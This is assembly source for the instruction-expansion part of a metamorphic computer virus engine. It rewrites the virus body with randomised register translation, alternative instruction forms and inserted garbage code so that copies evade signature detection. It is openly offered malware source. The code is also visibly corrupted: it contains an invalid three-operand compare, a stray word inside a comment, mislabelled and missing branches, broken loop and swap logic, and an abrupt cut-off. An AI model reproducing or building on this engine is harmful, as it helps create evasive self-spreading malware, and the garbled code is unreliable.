
;;
;; The expander
;; ------------
;;
;; This routine expands a shrinked pseudo-asm code previously shrinked with
;; the shrinker module. It's more easy to expand here following the
;; single/pairs/triplets rules than encoding it directly in x86 asm.
;;
;; The rules of expansion are exactly the opposite ones that we use for LEAadditionflag
;; compression. For example:
;;
;; MOV [Mem],Reg
;; MOV Reg2,[Mem]    ---> MOV Reg2,Reg 
;;
;; but also:
;;
;; PUSH Reg
;; POP Reg2          ---> MOV Reg2,Reg
;;
;; Then the expansion rule for MOV Reg2,Reg will be:
;;
;; MOV Reg2,Reg      ---> MOV [Mem],Reg + MOV Reg2,[Mem]
;;                   ---> PUSH Reg + POP Reg2
;;
;; where we select randomly one of the possible expansions.
;;
;; All the expansions are performed recursively, so every instruction involved
;; in an expansion will be expanded also, until we reach a recursivity level
;; specified in the variable [SizeOfExpansion] (from X to 3).
;; xpand_translateregister

;MAX_XPAND_SIZE              equ     6949201         ; 4-aligned        ; this will come in the updated versions

xpand_virus_body            proc
                            
                            mov     esi, [ebp+virii_instruc]        ; source of the expansion
                            mov     edi, [ebp+xpand_virii_results]  ; destiny of the expansion

    ; lets now get the register translation. So we must have present that DeltaReg
    ; cannot be EAX, ECX or EDX (due to API calls). Due to the usage of 32 bits registers
    ; we saved the used 32 bits register while shrinking the code, so we must select 
    ; that register first from one of the 4 first ones.

                            mov     eax, [ebp+xpand_virii_size] 
                            mov     [ebp+xpand_recurselevel], eax       ; set the initial 
                                                                    ; resursivity level
                            mov     eax, [ebp+hooy_createDecryptor]     ; if we are creating a
                            or      eax, eax                            ; decryptor, keep the
                            jnz     KeepRegisterTranslation          ; current register translation

                            mov     eax, 8
                            mov     [ebp+xpand_virii_reg0], eax         ; now we initialize the registers 
                            mov     [ebp+xpand_virii_reg1], eax
                            mov     [ebp+xpand_virii_reg2], eax
                            mov     [ebp+xpand_virii_reg3], eax
                            mov     [ebp+xpand_virii_reg4], eax
                            mov     [ebp+xpand_virii_reg5], eax
                            mov     [ebp+xpand_virii_reg6], eax
                            mov     [ebp+xpand_virii_reg7], eax
                            mov     eax, 4
                            mov     [ebp+xpand_virii_reg4], eax         ; set the ESP 
    Other32BitsReg:
                            call    random2
                            and     eax, 7
                            cmp     eax, 3                              ; get a 8 bit register
                            ja      Other32BitsReg
                            mov     ebx, [ebp+Register32Bits]           ; get the saved register
                            call    xpand_SetRegister4Xlation           ; set the translation
    OtherDeltaReg:
                            call    random2                              ; get a register
                            and     eax, 7
                            cmp     eax, 2                              ; eax, ecx or edx?
                            jbe     OtherDeltaReg                       ; if so, select another
                            cmp     eax, 4                              ; esp?
                            jz      OtherDeltaReg                       ; then, select another
                            mov     ebx, [ebp+DeltaRegister] 
                            call    xpand_SetRegister4Xlation           ; set the register xpand_8bits
                            or      eax, eax
                            jz      OtherDeltaReg                       ; other if it coincides with reg0
                            mov     ebx, -1                             ; set EBX = 0 at first
    NextRegister:
                            add     ebx, 1
                            cmp     ebx, [ebp+DeltaRegister]            ; EBX = DeltaRegister?
                            jz      NextRegister                        
                            cmp     ebx, [ebp+DeltaRegister]            ; EBX = Register32Bits?
                            jz      NextRegister
                            cmp     ebx, 4                              ; ESP?
                            jz      NextRegister
                            cmp     ebx, 8                              ; end of the loop?
                            jz      EndOfRegisters
    OtherRegister:
                            call    random2                              ; get a register
                            and     eax, 7 
                            cmp     eax, 4
                            jz      OtherRegister
                            call    xpand_SetRegister4Xlation           ; try to set the register
                            or      eax, eax
                            jz      OtherRegister                       ; if its set in another select
                            jmp     NextRegister                        ; another
    EndOfRegisters:
                            mov     eax, [ebp+DeltaRegister]            ; get the delta register
                            call    xpand_translateregister             ; translate it
                            mov     [ebp+xpand_translateregister], eax   ; save it!
    KeepRegisterTranslation:
    
                Xpand:
                            ;mov    eax, [esi]
                            call    XpandThisInstruction                ; call to expand the current
                            add     esi, 10h                            ; instruction
                            cmp     esi, [ebp+virii_addr0flast], edi
                            call    Xpand_UpdateLabels                  ; update the labels along the 
                            ret                                         ; code and finish

xpand_virus_body            endp

; Now, this function will check if the reigster passes at EAX exists in any other
; variable of register translation (i.e., if any other register is translated 
; to the one). If it is, it returns with EAX = 0. If not, it will set the number
; of register in EAX in the reisger translation variable of the register 
; EAX, and returns with EAX = 1.

xpand_SetRegister4Xlation   proc

                            cmp     eax, [ebp+xpand_virii_reg0]         ; check if the register in
                            jz      ReturnError                         ; EAX is used by other
                            cmp     eax, [ebp+xpand_virii_reg1]         ; register to be translated
                            jz      ReturnError                         ; at that one.
                            cmp     eax, [ebp+xpand_virii_reg2]
                            jz      ReturnError                         ; if so, return with EAX = 0
                            cmp     eax, [ebp+xpand_virii_reg3]
                            jz      ReturnError
                            cmp     eax, [ebp+xpand_virii_reg4]
                            jz      ReturnError
                            cmp     eax, [ebp+xpand_virii_reg5]
                            jz      ReturnError
                            cmp     eax, [ebp+xpand_virii_reg6]
                            jz      ReturnError
                            cmp     eax, [ebp+xpand_virii_reg7]
                            jz      ReturnError
                            or      ebx, ebx                            ; jump to the corresponding variable
                            jz      SetAt0                              ; setting to translate the register in
                            cmp     ebx, 1                              ; EBX
                            jz      SetAt1
                            cmp     ebx, 2
                            jz      SetAt2
                            cmp     ebx, 3
                            jz      SetAt3
                            cmp     ebx, 5
                            jz      SetAt5
                            cmp     ebx, 6
                            jz      SetAt6
                SetAt7:     mov     [ebp+xpand_virii_reg7], eax         ; set for the register ebx
                            jmp     ReturnNoError                       ; the translation in eax.
                SetAt0:     mov     [ebp+xpand_virii_reg0], eax         
                            jmp     ReturnNoError                      
                SetAt1:     mov     [ebp+xpand_virii_reg1], eax         
                            jmp     ReturnNoError
                SetAt2:     mov     [ebp+xpand_virii_reg2], eax
                            jmp     ReturnNoError
                SetAt3:     mov     [ebp+xpand_virii_reg3], eax
                            jmp     ReturnNoError
                SetAt5:     mov     [ebp+xpand_virii_reg5], eax
                            jmp     ReturnNoError
                SetAt6:     mov     [ebp+xpand_virii_reg6], eax
                            jmp     ReturnNoError
            ReturnError:
                            xor     eax, eax                            ; return with FALSE if error
                            ret
            ReturnNoError:
                            mov     eax, 1                              ; return with TRUE if all is OK
                            ret

xpand_SetRegister4Xlation   endp

; This function will translate the register in eax by the corresponding 
; new register, also in EAX

xpand_translateregister     proc

                            or      eax, eax                            ; jump to the corresponding variable usage.
                            jz      Get0
                            cmp     eax, 1
                            jz      Get1
                            cmp     eax, 2
                            jz      Get2
                            cmp     eax, 3
                            jz      Get3
                            cmp     eax, 4
                            jz      Return                              ; return ESP for ESP (No translation)
                            cmp     eax, 5
                            jz      Get5
                            cmp     eax, 6
                            jz      Get6
                            cmp     eax, 7 
                            jz      Get7
                            mov     eax, 8                              ; If the register is >=8, return 8 
                            ret
                    Get7:   mov     eax, [ebp+xpand_virii_reg7]         ; Get the translation and
                            ret                                         ; return
                    Get0:   mov     eax, [ebp+xpand_virii_reg0]
                            ret
                    Get1:   mov     eax, [ebp+xpand_virii_reg1]
                            ret
                    Get2:   mov     eax, [ebp+xpand_virii_reg2]
                            ret
                    Get3:   mov     eax, [ebp+xpand_virii_reg3]
                            ret
                    Get5:   mov     eax, [ebp+xpand_virii_reg5]
                            ret
                    Get8:   mov     eax, [ebp+xpand_virii_reg6]
                            ret

xpand_translateregister     endp

; This function returns the register in reverse translation, so it means, the 
; register that the register in EAX in translated to. It is the inversed 
; operation that performs xpand_translateregister and we pass the result to
; this function, we will get the original register. This function is useful
; to know which register we must use before the expansion when we want a 
; specific register in the expanded result.

xpand_reversetranslation    proc

                            cmp     eax, 4
                            jz      Return                              ; finds the register in the reigster
                            cmp     eax, [ebp+xpand_virii_reg0]         ; translation variable
                            jz      Return0
                            cmp     eax, [ebp+xpand_virii_reg1]
                            jz      Return1
                            cmp     eax, [ebp+xpand_virii_reg2]
                            jz      Return2
                            cmp     eax, [ebp+xpand_virii_reg3]
                            jz      Return3
                            cmp     eax, [ebp+xpand_virii_reg5]
                            jz      Return5
                            cmp     eax, [ebp+xpand_virii_reg6]
                            jz      Return6
                            cmp     eax, [ebp+xpand_virii_reg7]
                            jz      Return7
                            mov     eax, 8
                Return:     ret                                         ; when we find it, return the number
                Return0:    xor     eax, eax                            ; of register that uses that variable
                            ret                                         ; for translating itself.
                Return1:    mov     eax, 1
                            ret
                Return2:    mov     eax, 2
                            ret
                Return3:    mov     eax, 3
                            ret
                Return5:    mov     eax, 5
                            ret
                Return6:    mov     eax, 6
                            ret
                Return7:    mov     eax, 7 
                            ret

xpand_reversetranslation    endp

; To make real metamorphism happen, we have a way of coding every instruction, in
; both instruction expansion and reassembling. So, we check all of the possible
; pseudo-opcodes and we make a forumla for them. The formulas used here must
; be recognized by the shrinker.

XpandThisInstruction        proc

                            mov     eax, [esi+0Bh]                       ; get the label
                            mov     [edi+0Bh], eax                       ; copy it
                            mov     [edi+0Ch], esi                       ; set the new pointers
                            xor     eax, eax
                            mov     al, [esi]                            ; get the opcode

                            cmp     eax, 4Ch                             ; generic 32 bits operation?
                            ja      Xpand_Next001                        ; if not, jump
                            xor     eax, eax
                Generic:    mov     [ebp+xpand_32bits], eax               ; set the 8 bit flag (0 or 80h)
                            mov     eax, [esi]
                            and     eax, 78h                             ; get the operation
                            mov     [ebp+xpand_operate], eax             ; now set it
                            mov     eax, [esi]                           ; get the type of operation
                            and     eax, 7 
                            or      eax, eax                             ; OP Reg,Imm?
                            jz      OPRegImm                             
                            cmp     eax, 1                               ; OP Reg,Reg
                            jz      OPRegReg
                            cmp     eax, 2                               ; OP Reg,Mem?
                            jz      OPRegMem
                            cmp     eax, 3                               ; OP Mem,Reg?
                            jz      OPMemReg
                OPMemImm:                                                ; OP Mem, Imm
                            mov     eax, [ebp+xpand_32bits]               ; Get the 8 bit flag
                            or      eax, eax                             ; if 0, jump
                            jz      OPMemImm32
                            mov     eax, [esi+7]                         ; Get the Imm
                            and     eax, 0FFh                            ; Extend the sign
                            cmp     eax, 7Fh
                            jae     OpMemImmGet
                            or      eax, 0FFFFFF00h
                            jmp     OpMemImmGet
                OPMemImm32:
                            mov     eax, [esi+7]                         ; Get the normal value if 32 bits
                OpMemImmGet:
                            mov     [ebp+xpand_virii_immediate], eax     ; set the immediate
                            call    xpand_setmemory_address              ; copy the mem. address ref.
                                                                         ; (translating the indexes also)
                            call    xpand_GenOPMemImm                    ; generate an op mem, imm
                            jmp     _ret
                OPRegImm:
                            mov     eax, [ebp+xpand_32bits]               ; extend the sign for 8 bits
                            or      eax, eax                             ; operations
                            jz      OPRegImm32
                            mov     eax, [esi+7]
                            and     eax, 0FFh
                            cmp     eax, 7Fh
                            jbe     OPRegImmSet
                            or      eax, 0FFFFFF00h
                            jmp     OPRegImmSet
                OPRegImm32:
                            mov     eax, [esi+7]
                OPRegImmSet:
                            mov     [ebp+xpand_virii_immediate], eax        ; set the immediate
                            mov     eax, [esi+1]                            ; get the register
                            and     eax, 0FFh
                            call    xpand_translateregister                 ; translate it to the new one
                            mov     [ebp+xpand_register], eax               ; set it
                            call    xpand_GenOPRegImm                       ; generate and OP Reg,Imm
                            jmp     _ret
                OPRegReg:
                            mov     eax, [esi+1]                            ; get the source register
                            and     eax, 0FFh
                            call    xpand_translateregister                 ; translate it and set it
                            mov     [ebp+xpand_virii_srcreg], eax          
                            mov     eax, [esi+7]                            ; set the destiny register
                            and     eax, 0FFh
                            call    xpand_translateregister                 ; translate it and set it
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenOPRegReg                       ; generate an OP Reg,Reg
                            jmp     _ret
                OPRegMem:
                            call    xpand_setmemory_address                 ; copy the memory address
                            mov     eax, [esi+7]                            ; with indexes translation
                            and     eax, 0FFh
                            call    xpand_translateregister                 ; translate the destiny reg.
                            mov     [ebp+xpand_register], eax               ; set it
                            call    xpand_GenOPRegMem                       ; generate an OP Reg,Mem
                            jmp     _ret
                OPMemReg:
                            call    xpand_setmemory_address                 ; copy the memory address
                            mov     eax, [esi+7]                            ; with indexe translation
                            and     eax, 0FFh
                            call    xpand_translateregister                 ; translate the source reg.
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenOPMemReg                       ; generate an OP Mem,Reg
                            jmp     _ret
            Xpand_Next001:
                            cmp     eax, 00+80h                             ; get if its a 8 bit genetic
                            jb      Xpand_Next002                           ; operation
                            cmp     eax, 4Ch+80h
                            ja      Xpand_Next002
                            mov     eax, 80h                                ; if it is, set "8 bits usage"
                            jmp     Generic                                 ; (value 80h in [xpand_32bits]) and
                                                                            ; jump to make the operation
            Xpand_Next002:
                            cmp     eax, 50h                                ; PUSH Reg?
                            jnz     Xpand_Next003
                            mov     eax, [esi+1]                            ; then, translate the register
                            and     eax, 0FFh                               ; and set it in the 
                            call    xpand_translateregister                 ; corresponding filed
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenPUSHReg                        ; generate a PUSH Reg
                            jmp     _ret
            Xpand_Next003:
                            cmp     eax, 51h                                ; PUSH Mem?
                            jnz     Xpand_Next004
                            call    xpand_setmemory_address                 ; then, set the memory address
                            xor     eax, eax                                ; (with index translation),
                            mov     [ebp+xpand_32bits], eax                  ; clear the "8 bits" flag and
                            call    xpand_GenPUSHMem                        ; generate the PUSH Mem
                            jmp     _ret
            Xpand_Next004:
                            cmp     eax, 58h                                ; POP Reg?
                            jnz     Xpand_Next005
                            mov     eax, [esi+1]                            ; translate the register, set
                            and     eax, 0FFh                               ; it into the working field
                            call    xpand_setmemory_address                 ; and generate a POP reg
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenPOPReg
                            jmp     _ret
            Xpand_Next005:
                            cmp     eax, 59h                                ; POP Mem?
                            jnz     Xpand_Next006
                            call    xpand_setmemory_address                 ; then, copy the memory address
                            xor     eax, eax                                ; with index translation, clear
                            mov     [ebp+xpand_32bits], eax                  ; the "8 bits" flag and call
                            call    xpand_GenPOPMem                         ; the function to generate a
                            jmp     _ret                                    ; POP Mem.
            Xpand_Next006:
                            cmp     eax, 60h                                ; PUSH Imm?
                            jnz     Xpand_Next007
                            mov     eax, [esi+7]                            ; set the immediate
                            mov     [ebp+xpand_virii_immediate], eax
                            call    xpand_GenPUSHImm                        ; generate a PUSH Imm
                            jmp     _ret
            Xpand_Next007:
                            cmp     eax, 70h                                ; Jcc?
                            jb      Xpand_Next008
                            cmp     eax, 7Fh
                            ja      Xpand_Next008
                            mov     [ebp+xpand_operate], eax                ; set the type of conditional
                            mov     eax, [esi+1]                            ; jump in the operation field
                            mov     [ebp+xpand_virii_immediate], eax        ; and the label in the 
                            call    xpand_GenJcc                            ; Imm field, and generate it.
                            jmp     _ret
            Xpand_Next008:
                            cmp     eax, 0E0h                               ; NOT Reg?
                            jnz     Xpand_Next009
                            call    xpand_register                          ; then, translate and set the
                            call    xpand_GenNOTReg                         ; 32 bits register and generate 
                            jmp     _ret                                    ; a NOT Reg
            Xpand_Next009:
                            cmp     eax, 0E1h                               ; NOT Mem?
                            jnz     Xpand_Next010
                            call    xpand_setmemory_address                 ; then, copy and translate the
                            xor     eax, eax                                ; memory address and indexes,
                            mov     [ebp+xpand_32bits], eax                  ; set "32 bits usage" and
                            call    xpand_GenNOTMem                         ; generate a NOT Mem
                            jmp     _ret
            Xpand_Next010:
                            cmp     eax, 0E2h              ; NOT Reg8?
                            jnz     Xpand_Next011
                            call    Xpand_Set8BitsRegister    ; Then, translate and set the
                            call    xpand_GenNOTReg           ; 8 bits register and generate
                            jmp     _ret                      ; a NOT Reg8
            Xpand_Next011:
                            cmp     eax, 0E3h              ; The same as with E1 (NOT Mem)
                            jnz     Xpand_Next012          ; but with 8 bits operands.
                            call    xpand_setmemory_address 
                            mov     eax, 80h
                            mov     [ebp+xpand_32bits], eax     
                            call    xpand_GenNOTMem
                            jmp     _ret
            Xpand_Next012:
                            cmp     eax, 0E4h              ; NEG Reg?
                            jnz     Xpand_Next013   
                            call    Xpand_SetRegister      ; Then, translate the register,
                            call    xpand_GenNEGReg        ; set it and generate the op.
                            jmp     _ret
            Xpand_Next013:
                            cmp     eax, 0E5h              ; NEG Mem?
                            jnz     Xpand_Next014
                            call    Xpand_SetMemoryAddress ; Copy the address, translate
                            xor     eax, eax               ; the indexes, set "32 bits"
                            mov     [ebp+xpand_32bits], eax    ; flag and generate the instrc.
                            call    xpand_GenNEGMem
                            jmp     _ret
            Xpand_Next014:
                            cmp     eax, 0E6h              ; NEG Reg8?
                            jnz     Xpand_Next015
                            call    Xpand_Set8BitsRegister ; Then do the same as with
                            call    xpand_GenNEGReg        ; E4 (NEG Reg) but with 8 bits
                            jmp     _ret                   ; operands
            Xpand_Next015:
                            cmp     eax, 0E7h              ; NEG Mem8?
                            jnz     Xpand_Next016
                            call    xpand_setmemory_address ; Then do the same as with E5
                            mov     eax, 80h                ; (NEG Mem) but with a 8 bits
                            mov     [ebp+xpand_32bits], eax    ; memory address.
                            call    xpand_GenNEGMem
                            jmp     _ret
            Xpand_Next016:
                            cmp     eax, 0E8h              ; CALL @xxx?
                            jnz     Xpand_Next017
            CopyInstruction:
                            mov     eax, [esi]             ; Then copy the instruction.
                            mov     [edi], eax             ; It's one of the very few that
                            mov     eax, [esi+4]           ; haven't a translation.
                            mov     [edi+4], eax
                            mov     eax, [esi+7]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     _ret
            Xpand_Next017:
                            cmp     eax, 0E9h              ; JMP @xxx?
                            jnz     Xpand_Next018 
                            mov     eax, [esi+1]           ; Get the label, set it in the
                            mov     [ebp+xpand_virii_immediate], eax ; work field and generate the
                            call    xpand_GenJMP               ; JMP instruction.
                            jmp     _ret
            Xpand_Next018:
                            cmp     eax, 0EAh              ; CALL Mem?
                            jnz     Xpand_Next019
                            xor     eax, eax               ; Set "32 bits" usage
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_setmemory_address ; Translate indexes and copy
                                                        ; the operands
                            call    xpand_GenCALLMem          ; Generate a CALL Mem
                            jmp     _ret
            Xpand_Next019:
                            cmp     eax, 0EBh              ; JMP Mem?
                            jnz     Xpand_Next020
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax    ; Set "32 bits"
                            call    xpand_setmemory_address ; Translate and set the memory
                            call    xpand_GenJMPMem           ; address and generate the JMP
                            jmp     _ret
            Xpand_Next020:
                            cmp     eax, 0ECh           ; CALL Reg?
                            jnz     Xpand_Next021
                            xor     eax, eax            ; Set "32 bits"
                            mov     [ebp+xpand_32bits], eax
                            call    Xpand_SetRegister   ; Translate and set the register
                            call    xpand_GenCALLReg       ; Generate the CALL Reg
                            jmp     _ret
            Xpand_Next021:
                            cmp     eax, 0EDh           ; JMP Reg?
                            jnz     Xpand_Next022
                            xor     eax, eax            ; Set "32 bits"
                            mov     [ebp+xpand_32bits], eax
                            call    Xpand_SetRegister   ; Translate and set the register
                            call    xpand_GenJMPReg        ; Generate the JMP Reg
                            jmp     _ret
            Xpand_Next022:
                            cmp     eax, 0F0h           ; SHIFT Reg?
                            jnz     Xpand_Next023
        Xpand_TranslateReg:
                            mov     eax, [esi+1]        ; Translate the register
                            and     eax, 0FFh
                            call    xpand_translateregister 
                            mov     [esi+1], eax        ; Set the register
                            jmp     CopyInstruction     ; Copy the instruction
            Xpand_Next023:
                            cmp     eax, 0F2h           ; SHIFT Reg8?
                            jz      Xpand_TranslateReg  ; Then jump to translate et all
            Xpand_Next024:
                            cmp     eax, 0F1h           ; SHIFT Mem?
                            jnz     Xpand_Next025
        Xpand_TranslateMem:
                            call    Xpand_SetMemoryAddress ; Translate the memory address
                            mov     eax, [esi]             ; and copy the instruction
                            mov     [edi], eax
                            call    Xp_CopyMemoryReference
                            mov     eax, [esi+7]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     _ret
            Xpand_Next025:
                            cmp     eax, 0F3h          ; SHIFT Mem8?
                            jz      Xpand_TranslateMem ; Then do the same as with Mem32
            Xpand_Next026:
                            cmp     eax, 0F4h          ; APICALL_BEGIN?
                            jnz     Xpand_Next027
                            xor     eax, eax                ; Set "32 bits"
                            mov     [ebp+xpand_32bits], eax
                            mov     [ebp+xpand_register], eax  ; Generate a PUSH EAX
                            call    Xp_GenPUSHReg
                            mov     eax, 1
                            mov     [ebp+xpand_register], eax  ; Generate a PUSH ECX
                            call    Xp_GenPUSHReg
                            mov     eax, 2
                            mov     [ebp+xpand_register], eax  ; Generate a PUSH EDX
                            call    xpand_GenPUSHReg
                            jmp     _ret
            Xpand_Next027:
                            cmp     eax, 0F5h         ; APICALL_END?
                            jnz     Xpand_Next028
                            xor     eax, eax                ; Set "32 bits"
                            mov     [ebp+xpand_32bits], eax
                            mov     eax, 2
                            mov     [ebp+xpand_register], eax  ; Generate a POP EDX
                            call    xpand_GenPOPReg
                            mov     eax, 1
                            mov     [ebp+xpand_register], eax  ; Generate a POP ECX
                            call    xpand_GenPOPReg
                            xor     eax, eax
                            mov     [ebp+xpand_register], eax  ; Generate a POP EAX
                            call    xpand_GenPOPReg
                            jmp     _ret
            Xpand_Next028:
                            cmp     eax, 0F6h          ; APICALL_STORE?
                            jnz     Xpand_Next029_
                            xor     eax, eax
                            mov     [ebp+xpand_register], eax ; Set EAX as destiny register
                            call    xpand_setmemory_address ; Translate the memory address
                            mov     eax, 40h               ; Set a MOV instruction
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax    ; Set "32 bits" usage
                            call    xpand_GenOPMemReg         ; Generate a MOV Reg,[Mem]
                            jmp     _ret
            Xpand_Next029_:
                            cmp     eax, 0F8h          ; MOVZX Reg,byte ptr [Mem]?
                            jnz     Xpand_Next029
                            mov     eax, [esi+7]       ; Translate the register
                            and     eax, 0FFh
                            call    xpand_translateregister 
                            mov     [ebp+xpand_register], eax
                            call    xpand_setmemory_address ; Translate and copy the mem.
                            call    xpand_GenMOVZX            ; address and generate a MOVZX
                            jmp     _ret
            Xpand_Next029:
                            cmp     eax, 0FCh          ; LEA?
                            jnz     Xpand_Next030
                            call    xpand_setmemory_address  ; Then translate and copy the
                            mov     eax, [esi+7]            ; memory address, do the same
                            and     eax, 0FFh               ; with the destiny register,
                            call    xpand_translateregister ; set "32 bits" register and
                            mov     [ebp+xpand_register], eax  ; generate the LEA,
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenLEA
                            jmp     _ret
            Xpand_Next030:
                            cmp     eax, 0FEh          ; RET?
                            jnz     Xpand_Next031
                            call    xpand_GenRET          ; Then generate a RET
                            jmp     _ret
            Xpand_Next031:
                            cmp     eax, 0FFh          ; NOP?
                            jz      Return             ; Then avoid it
            Xpand_Next032:
                            cmp     eax, 0F7h          ; SET_WEIGHT?
                            jnz     Xpand_Next033

                            call    xpand_setmemory_address
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            mov     eax, [esi+7]
                            and     eax, 0FFh
                            mov     [ebp+xpand_virii_immediate], eax
                            mov     eax, [esi+8]
                            and     eax, 0FFh
                            call    xpand_translateregister
                            mov     [ebp+xpand_register], eax
                            mov     eax, [esi+9]
                            and     eax, 0FFh
                            call    xpand_translateregister
                            mov     [ebp+xpand_virii_srcreg], eax
                            call    xpand_MakeSET_WEIGHT
            ;                 jmp   @@Ret
        Xpand_Next033:



            _ret:           call    random2             ; Get a random chance of 1/16
                            and     eax, 0Fh
                            or      eax, eax
                            jnz     Return
                            mov     eax, [esi]         ; If we get it, let's code garbage
                            and     eax, 78h
                            cmp     eax, 38h           ; If the instruction immediately
                            jz      OnlyNOP            ; above is CMP, TEST, CALL Mem or
                            cmp     eax, 48h           ; APICALL_STORE, then code only
                            jz      OnlyNOP            ; NOP (FD 90, insert byte 90)
                            cmp     eax, 0EAh
                            jz      OnlyNOP
                            cmp     eax, 0F6h
                            jz      OnlyNOP
                            call    Xp_InsertGarbage   ; Insert some garbage
                Return:     ret
                OnlyNOP:    mov     eax, 90FDh
                            mov     [edi], eax         ; Set a NOP
                            xor     eax, eax
                            mov     [edi+0Bh], eax
                            mov     [edi+0Ch], esi     ; Set the new pointer
                            add     edi, 10h
                            ret

XpandThisInstruction        endp

; now this function gets the labels at the label table and then translate them to
; their new address, using the updated instruction pointers at field +0C on
; the instruction itself. As we can see, the translation is trivial with 
; this system.

Xpand_UpdateLabels          proc

                            mov     ebx, [ebp+virii_labeltable]       ; get the label table address
                            mov     ecx, [ebp+virii_numberOfLabel]    ; get the number of labels
        LoopLabel:
                            mov     eax, [ebx]                  ; get the address of the old instruc.
                            mov     eax, [eax+0Ch]              ; get the pointer to the new one
                            mov     [ebx+4], eax                ; set it as the new label pointer
                            add     ecx, 8                      ; next label
                            sub     ecx, 1
                            or      ecx, ecx                    ; repeat it for all labels
                            jnz     LoopLabel
                            ret

Xpand_UpdateLabels          endp

; this function gets the indexes, translates them to their new register
; equivalent and set them and the addition into their corresponding working
; fields. If a memory address is an identificator of a data variable (09h as
; first index) then the identificator is translated looking at the table
; of variable identificators and set up, completing it with the new
; Delta Register.

xpand_setmemory_address     proc

                            mov     eax, [esi+1]                ; get the register
                            and     eax, 0FFh
                            cmp     eax, 9                      ; is it a variable identificator?
                            jnz     Next_NoIdent                ; if not, act normally
                            mov     eax, [esi+3]                ; get the identificator
                            mov     eax, [eax]                  ; get the new variable address and
                            add     eax, [ebp+virii_newdatasec] ; transform it to an
                                                                ; offset to add to DeltaRegister
                            mov     [ebp+xpand_virii_addition],eax  ; get it
                            mov     eax, [ebp+DeltaRegister]
                            call    xpand_translateregister
                            mov     [ebp+xpand_virii_mem1], eax         ; set the new delta
                            mov     eax, 8
                            mov     [ebp+xpand_virii_mem2], eax         ; set index2 as <no_reg>
                            ret                                         ; return
            Next_NoIdent:
                            mov     eax, [esi+1]                        ; get the first index
                            and     eax, 0FFh
                            cmp     eax, 8                              ; is there a register?
                            jae     Next_Index                          ; if not, process next index
                            call    xpand_translateregister             ; translate the register
                Next_Index:
                            mov     [ebp+xpand_virii_mem1], eax         ; set the register
                            mov     eax, [esi+1]
                            mov     ecx, 0C0h                           ; set the multiplicator in ECX
                            and     eax, 3Fh
                            cmp     eax, 8                              ; get the register in EAX
                            jae     Next_Index2                         ; if its not a register, jump
                            push    ecx
                            call    xpand_translateregister
                            pop     ecx                                 ; translate the register and set
                            or      eax, ecx                            ; if its not a register, jump
                Next_Index2:
                            mov     [ebp+xpand_virii_mem2], eax         ; set the 2nd index
                            mov     eax, [esi+2]                        ; set the dowrd addition
                            mov     [ebp+xpand_virii_addition], eax
                            call    randomboolean                       ; randomly select if we exchange
                            jz      _return                             
                            or      ecx, ecx                            ; the multiplicator is 0?
                            jnz     _return                             ; if not, do not exchange
                            mov     eax, [ebp+xpand_virii_mem1]         ; exchange them if we can
                            mov     eax, [ebp+xpand_virii_mem2]
                            mov     [ebp+xpand_virii_mem1], eax
                            mov     [ebp+xpand_virii_mem2], eax
                _return:    ret                                         ; retrun

xpand_setmemory_address     endp

Xpand_Set8BitsRegister      proc

                            mov     eax, 80h                            ; set "8 bits" register
                            jmp     xpand_setregister_common

Xpand_Set8BitsRegister      endp

Xpand_SetRegister           proc

                            xor     eax, eax                            ; set "32 bit" register
    xpand_setregister_common:
                            mov     [ebp+xpand_32bits], eax              ; set the number of bits flag
                            mov     eax, [esi+1] 
                            and     eax, 0FFh                           ; get the register at +1 in the
                            call    xpand_translateregister             ; instruction, translate it
                            mov     [ebp+xpand_register], eax           ; and set the register

Xpand_SetRegister           endp

; 
;;  Instruction generation functions
;

; Generate an OP Reg,Imm

xpand_GenOPRegImm           proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single                              ; if 3 (max), do not recurse

                            call    randomboolean                       ; select randomly the shape of the 
                            or      eax, eax                            ; expansion
                            jz      Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Double
            
            ; mov Mem,Reg
            ; OP Mem,Imm
            ; mov Reg,Mem
        Triple:             mov     eax, [ebp+xpand_operate]
                            cmp     eax, 38h                    ; cmp?
                            jz      Double                      ; then make double (flags can be
                                                                ; affected with this type of triplets
                            cmp     eax, 48h                    ; test?
                            jz      Double                      ; the same as with CMP
                            cmp     eax, 40h                    ; MOV?
                            jz      Double                      ; then, the same, to avoid problems
                                                                ; with the shrinking
                            call    xpand_saveoperation         ; save the current op, and values
                            call    xpand_gettmepvar            ; allocate a temporary variable
                            mov     eax, [ebp+xpand_operate]    ; set mov operation (saving
                            push    eax                         ; the last one)
                            mov     eax, 40h                    
                            mov     [ebp+xpand_operate], eax
                            call    randomboolean               ; select randomly, if we make:
                            or      eax, eax                    ; MOV Mem,Reg
                            jz      Triple_1                    ; OP Mem,Imm
                            call    xpand_GenOPMemReg           ; MOV Reg,Mem
                            pop     eax                         ; or
                            mov     [ebp+xpand_operate], eax    ; MOV Mem,Imm
                            call    xpand_GenOPMemImm           ; OP Mem,Reg
            Triple_Common:                                      ; MOV Reg,Mem
                            mov     eax, 40h                    ; the only problem that we
                            mov     [ebp+xpand_operate], eax    ; can have is with the op.
                            call    xpand_GenOPRegMem           ; SUB Reg,Imm, but since we
                            jmp     xpand_restoreOPandDecreaseRecurseLevel ; have substituted
                                                                ; that operation in the
            Triple_1:       call    xpand_GenOPMemImm           ; shrinking by ADD Reg,-Imm,
                            pop     eax                         ; we have no problem with
                            mov     [ebp+xpand_operate], eax    ; the instruction.
                            call    xpand_GenOPMemReg           
                            jmp     Triple_Common
            ; MOV Mem,Imm
            ; OP Reg,Mem

            Double:         mov     eax, [ebp+xpand_operate]    ; get the operation
                            cmp     eax, 40h                    ; MOV?
                            jz      Double_MOV                  ; then amke MOV-specific
                            cmp     eax, 38h                    ; CMP?
                            jz      Double_CMP                  ; then, CMP-specific
                            cmp     eax, 48h                    ; Test?
                            jz      Double_TEST                 ; then, TEST-specific
            Double_OP:      call    randomboolean               
                            or      eax, eax                    ; random true/false
